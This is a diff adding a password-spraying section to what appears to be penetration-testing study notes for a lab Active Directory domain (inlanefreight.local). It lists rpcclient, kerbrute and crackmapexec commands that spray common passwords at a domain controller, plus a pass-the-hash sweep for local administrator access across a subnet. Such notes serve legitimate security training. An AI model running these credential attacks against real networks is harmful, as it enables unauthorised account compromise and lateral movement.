@@ -33,3 +33,12 @@ net accounts
 import-module .\PowerView.ps1
 Get-DomainPolicy
 ```
+# Internal Password Spraying 
+## Linux
+```
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+# Administration Spray
+crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
